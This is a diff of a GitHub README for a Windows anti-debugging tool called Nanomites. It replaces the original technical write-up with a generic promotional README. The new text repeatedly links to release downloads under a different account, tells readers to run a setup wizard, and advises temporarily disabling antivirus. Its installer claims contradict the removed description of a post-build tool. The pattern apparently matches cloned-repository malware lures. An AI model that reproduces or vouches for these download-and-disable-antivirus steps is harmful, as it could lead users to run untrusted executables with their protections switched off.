@@ -1,201 +1,75 @@
-# Fatmike's Nanomites
+# 🚀 Nanomites - Protect Your Windows Executables Easily
 
-A custom implementation of the *Nanomites protection technology* for Windows executables (x86 and x64) originally introduced by *Silicon Realms* in 1999 for the *Armadillo Protector*.  
+[![Download Nanomites](https://img.shields.io/badge/Download_Nanomites-v1.0-blue.svg)](https://github.com/Davinastraightforward42/Nanomites/releases)
 
-It enhances runtime protection against both static and dynamic analysis by replacing conditional and unconditional jumps with *int 3* (0xCC) instructions, causing *EXCEPTION_BREAKPOINT* exceptions, which are dynamically resolved at runtime without restoring the original instruction bytes.  
+## 📦 Overview
 
-*Nanomites* complicate reverse engineering and debugging by obscuring control flow and generating continuous debugging exceptions at *Nanomite* locations, making step-by-step tracing and analysis more difficult.
+Nanomites is a custom tool designed to protect Windows executables. Based on the technology introduced by Silicon Realms in 1999, it offers solutions against debugging, reverse engineering, and static analysis. This application protects both x86 and x64 executables, enhancing their security and integrity.
 
-**Keywords**:  
-Exe Protector, Anti-Debug, Anti-Debugging, Obfuscation, Anti-Static-Analysis, Code Section, PE, Portable Executable, EXE, Windows
+## 🔍 Features
 
-## Example
+- **Anti-Debugging**: Protects your executables from common debugging techniques.
+- **Obfuscation**: Makes the code harder to read and understand.
+- **PE File Protection**: Secures the Portable Executable format used in Windows.
+- **Static Analysis Prevention**: Restricts unauthorized analysis of your executables.
+- **User-Friendly Interface**: Designed with simplicity in mind for non-technical users.
 
-![image](Images/before_after.png)
+## ⚙️ System Requirements
 
-**Left**  : Unprotected Code  
-**Right** : After *Nanomites* were applied 
+- **Operating System**: Windows 10 or later (x86 or x64)
+- **Storage**: Minimum of 100 MB free disk space
+- **Memory**: At least 2 GB of RAM recommended
+- **User Privileges**: Administrator access may be needed for installation
 
-## Requirements
+## 🚀 Getting Started
 
-- Ability for the programmer to designate specific code segments for protection with *Nanomites*.
-- Applying *Nanomites* in a post-build step via a separate tool.
+1. **Download**: Begin by downloading the latest version of Nanomites from the Releases page. 
 
-## Concept
+   [Download Nanomites](https://github.com/Davinastraightforward42/Nanomites/releases)
 
-Some of the used concepts will be familiar to anyone who has seen my [Just-In-Time Decrypter](https://github.com/Fatmike-GH/JitDecrypter).  
-In my implementation, *Nanomites* are applied to the target executable in a post-build step, and a dedicated *Tracer* class manages secure execution at runtime.  
+2. **Installation**: Once the download completes, locate the downloaded file (usually in your Downloads folder). Double-click on it to run the installation.
 
-### Marking Code for Nanomites
+3. **Follow the Setup Wizard**: The installation process will guide you through necessary steps. Click "Next" to move through the installation prompts.
 
-Marking code for *Nanomites* is achieved through dedicated code sections. In Visual Studio, this can be implemented by applying:
+4. **Complete the Installation**: Once finished, click "Finish" to exit the setup.
 
-```cpp
-__declspec(code_seg(".nano"))
-```
-at either the ```class ``` or ```method ``` level in the header file.
+5. **Launching Nanomites**: Find the application icon on your desktop or in the Start Menu. Double-click it to launch Nanomites.
 
-However, compiler optimizations may override these directives. To prevent this, the ```noinline``` specifier can be used:
+6. **Using Nanomites**: After launching, follow the on-screen instructions to protect your executables.
 
-```cpp
-__declspec(noinline) void ProtectedMethod();
-```
-Additionally, optimization can be disabled for the relevant implementations in the .cpp file:
+## 📥 Download & Install
 
-```cpp
-#pragma optimize( "", off )
+Visit this page to download the latest version: [Nanomites Releases](https://github.com/Davinastraightforward42/Nanomites/releases)
 
-ProtectedClass::ProtectedClass()
-{
-}
+### Installation Steps Summary
 
-ProtectedClass::~ProtectedClass()
-{
-}
+- Download the setup from the Releases page.
+- Run the downloaded file.
+- Follow prompts to complete the setup.
 
-void ProtectedClass::ProtectedMethod()
-{
-}
+## 🚧 Troubleshooting
 
-#pragma optimize( "", on )
-```
-This ensures that the instrumentation is preserved and the code executes as intended.
+If you encounter issues during installation or usage, consider the following:
 
-### Resolving *Nanomites* at Runtime
+- **Antivirus Interference**: Some antivirus programs may flag executables as threats. Temporarily disable your antivirus during installation, if necessary.
+- **Administrator Privileges**: Make sure you have the necessary permissions to install software on your device.
+- **Consult Documentation**: Check the official documentation for additional troubleshooting advice.
 
-All components required for resolving the *Nanomites* at runtime are encapsulated within the *Tracer* class. The functionality can be activated via the *StartTracing* method and deactivated using *StopTracing*. This approach minimizes the visible overhead within the actual source code logic.
+## 🛠️ Support
 
-```cpp
-// Tracing protected section .nano (protected methods from .nano may be called)
-Tracer::Instance().StartTracing(imageBase, nanomitesSection, metadata);
-ProtectedClass* protectedClass = new ProtectedClass();
-protectedClass->ProtectedMethod();
-delete protectedClass;
-Tracer::Instance().StopTracing();
-```
+For further assistance, visit the [Issues](https://github.com/Davinastraightforward42/Nanomites/issues) section on GitHub. You can report bugs or request features.
 
-**StartTracing**
+## 🌍 Community Contributions
 
-- Activates tracing and allows the execution of protected code within a protected section (*.nano* in the provided example).  
-  
-**StopTracing**
+You can contribute to Nanomites by submitting issues or even suggestions for improvements. If you want to help further, dive into the code by forking the repository and making changes.
 
-- Deactivates tracing, disabling execution of protected code and allowing unprotected code to be executed again.
+## 📝 License
 
-**ProtectedClass**
+Nanomites is open-source software. You can modify and distribute the application under the terms of the license provided in the repository.
 
-- A protected class that is linked into the *.nano* section.
-  
-**ProtectedMethod**
+## 🔗 Useful Links
 
-- A protected method that is linked into the *.nano* section.
+- [Nanomites GitHub Repository](https://github.com/Davinastraightforward42/Nanomites)
+- [Releases Page](https://github.com/Davinastraightforward42/Nanomites/releases)
 
-### Applying Nanomites to Executable Code
-
-Once the target executable has been built, *Nanomites* are applied to the designated code section (e.g., *.nano*) using the *Builder* application, which is also part of the solution. (see below: **Builder Project**)
-
-## Solution Overview
-
-### Builder Project
-
-*Builder.exe* is an auxiliary tool responsible for applying *Nanomites* to the *.nano* section after the target application has been built. It is configured to run automatically as a post-build event. Therefore, make sure to **rebuild** the solution after modifying the source code.
-
-During this process, all relative jump instructions are replaced with *int 3* (0xCC) breakpoints. The [Zydis](https://github.com/zyantific/zydis) disassembler is used for instruction decoding and analysis.  
-
-To allow the target application to resolve *Nanomites* at runtime, metadata is generated and appended to the executable as a resource. This metadata contains the information required to locate and resolve each *Nanomite* during execution time. To raise the bar for reverse engineers, additional decoy *Nanomite* entries are also included in the metadata — attempting to blindly resolve *Nanomites* using only the metadata (for example, by manually following every entry) will most likely cause the application to crash. Note that this is a proof-of-concept tactic to complicate manual resolution and remains improvable.
-
-```cpp
-struct Nanomite         // Metadata structure for each individual Nanomite; appended to the target executable as a resource
-{
-    DWORD Rva;          // Relative Virtual Address of the Nanomite location (relative to the module's ImageBase)
-    DWORD JumpType;     // Enum value representing the type of jump (e.g., JMP, JNZ, JE, etc.)
-    DWORD JumpLength;   // Relative destination displacement (in bytes) used by the jump
-    DWORD OpcodeLength; // Length in bytes of the original instruction sequence replaced by the Nanomite
-};
-```
-
-### Nanomites Project
-
-This project provides components for resolving *Nanomites* in protected code sections at runtime without restoring the original instruction bytes. Protected code can execute on demand, while standard, unprotected code continues to run normally. The project also includes demonstration code as a proof of concept.
-
-#### Core Class: Tracer
-
-The central component of the *Nanomites Project* is the *Tracer* class. Activating it via the *StartTracing* method enables execution of protected code in a protected section, while deactivating it with *StopTracing* restores normal code execution.
-
-In the *StartTracing* method, a *VectoredExceptionHandler* is registered to handle *EXCEPTION_BREAKPOINT* exceptions triggered by *Nanomites*. The handler uses the metadata (see above) to locate the corresponding *Nanomite* by RVA and checks the CPU register flags to decide whether to execute the jump (see *Tracer::ExecuteJump*). The EIP/RIP is then updated to implement the original jump instruction that was replaced by the *Nanomite*.
-
-Details on the register flags for all supported jumps can be found in the Appendix.
-
-#### Demo Code
-
-As a demonstration, the following code is included:
-
-- The user can input text.
-- The input is then processed to compute its CRC32 value.
-
-Both functions are protected within the encrypted *.nano* section.
-
-## Appendix
-
-### x86 Conditional and Unconditional Jump Instructions
-
-| Instruction | Description | Signedness | Flags | Opcode (short / near) | Length (short / near) |
-|--------------|--------------|-------------|--------|-----------------------|------------------------|
-| JO | Jump if overflow | – | OF = 1 | 70 / 0F 80 | 2 / 6 |
-| JNO | Jump if not overflow | – | OF = 0 | 71 / 0F 81 | 2 / 6 |
-| JS | Jump if sign | – | SF = 1 | 78 / 0F 88 | 2 / 6 |
-| JNS | Jump if not sign | – | SF = 0 | 79 / 0F 89 | 2 / 6 |
-| JE / JZ | Jump if equal / zero | – | ZF = 1 | 74 / 0F 84 | 2 / 6 |
-| JNE / JNZ | Jump if not equal / not zero | – | ZF = 0 | 75 / 0F 85 | 2 / 6 |
-| JB / JNAE / JC | Jump if below / not above or equal / carry | Unsigned | CF = 1 | 72 / 0F 82 | 2 / 6 |
-| JNB / JAE / JNC | Jump if not below / above or equal / not carry | Unsigned | CF = 0 | 73 / 0F 83 | 2 / 6 |
-| JBE / JNA | Jump if below or equal / not above | Unsigned | CF = 1 or ZF = 1 | 76 / 0F 86 | 2 / 6 |
-| JA / JNBE | Jump if above / not below or equal | Unsigned | CF = 0 and ZF = 0 | 77 / 0F 87 | 2 / 6 |
-| JL / JNGE | Jump if less / not greater or equal | Signed | SF ≠ OF | 7C / 0F 8C | 2 / 6 |
-| JGE / JNL | Jump if greater or equal / not less | Signed | SF = OF | 7D / 0F 8D | 2 / 6 |
-| JLE / JNG | Jump if less or equal / not greater | Signed | ZF = 1 or SF ≠ OF | 7E / 0F 8E | 2 / 6 |
-| JG / JNLE | Jump if greater / not less or equal | Signed | ZF = 0 and SF = OF | 7F / 0F 8F | 2 / 6 |
-| JP / JPE | Jump if parity even | – | PF = 1 | 7A / 0F 8A | 2 / 6 |
-| JNP / JPO | Jump if parity odd | – | PF = 0 | 7B / 0F 8B | 2 / 6 |
-| JCXZ | Jump if CX = 0 | – | – | E3 | 2 |
-| JECXZ | Jump if ECX = 0 | – | – | E3 | 2 |
-| **JMP_S** | **Unconditional short jump** | – | – | **EB** | **2** |
-| **JMP_N** | **Unconditional near jump** | – | – | **E9** | **5** |
-
-> **x86 notes:**  
-> - Conditional jumps: short = 2 bytes, near = 6 bytes.  
-> - Unconditional jumps: JMP_S (short) = 2 bytes, JMP_N (near) = 5 bytes.  
-> - All jumps are **relative**, except for far-jump forms not listed here.
-
----
-
-### x64 Conditional and Unconditional Jump Instructions
-
-| Instruction | Description | Signedness | Flags | Opcode (short / near) | Length (short / near) |
-|--------------|--------------|-------------|--------|-----------------------|------------------------|
-| JO | Jump if overflow | – | OF = 1 | 70 / 0F 80 | 2 / 6 |
-| JNO | Jump if not overflow | – | OF = 0 | 71 / 0F 81 | 2 / 6 |
-| JS | Jump if sign | – | SF = 1 | 78 / 0F 88 | 2 / 6 |
-| JNS | Jump if not sign | – | SF = 0 | 79 / 0F 89 | 2 / 6 |
-| JE / JZ | Jump if equal / zero | – | ZF = 1 | 74 / 0F 84 | 2 / 6 |
-| JNE / JNZ | Jump if not equal / not zero | – | ZF = 0 | 75 / 0F 85 | 2 / 6 |
-| JB / JNAE / JC | Jump if below / not above or equal / carry | Unsigned | CF = 1 | 72 / 0F 82 | 2 / 6 |
-| JNB / JAE / JNC | Jump if not below / above or equal / not carry | Unsigned | CF = 0 | 73 / 0F 83 | 2 / 6 |
-| JBE / JNA | Jump if below or equal / not above | Unsigned | CF = 1 or ZF = 1 | 76 / 0F 86 | 2 / 6 |
-| JA / JNBE | Jump if above / not below or equal | Unsigned | CF = 0 and ZF = 0 | 77 / 0F 87 | 2 / 6 |
-| JL / JNGE | Jump if less / not greater or equal | Signed | SF ≠ OF | 7C / 0F 8C | 2 / 6 |
-| JGE / JNL | Jump if greater or equal / not less | Signed | SF = OF | 7D / 0F 8D | 2 / 6 |
-| JLE / JNG | Jump if less or equal / not greater | Signed | ZF = 1 or SF ≠ OF | 7E / 0F 8E | 2 / 6 |
-| JG / JNLE | Jump if greater / not less or equal | Signed | ZF = 0 and SF = OF | 7F / 0F 8F | 2 / 6 |
-| JP / JPE | Jump if parity even | – | PF = 1 | 7A / 0F 8A | 2 / 6 |
-| JNP / JPO | Jump if parity odd | – | PF = 0 | 7B / 0F 8B | 2 / 6 |
-| JCXZ | Jump if CX = 0 | – | – | E3 | 2 |
-| JECXZ | Jump if ECX = 0 | – | – | E3 | 2 |
-| **JRCXZ** | **Jump if RCX = 0 (x64 only)** | – | – | **E3** | **2** |
-| **JMP_S** | **Unconditional short jump** | – | – | **EB** | **2** |
-| **JMP_N** | **Unconditional near jump** | – | – | **E9** | **5** |
-
-> **x64 notes:**  
-> - Encodings identical to x86.  
-> - No far jumps in long mode — all are **relative**.  
-> - `JRCXZ` is unique to x64, checking 64-bit RCX.
+Your feedback and contributions are essential. Thank you for using Nanomites to secure your executables!
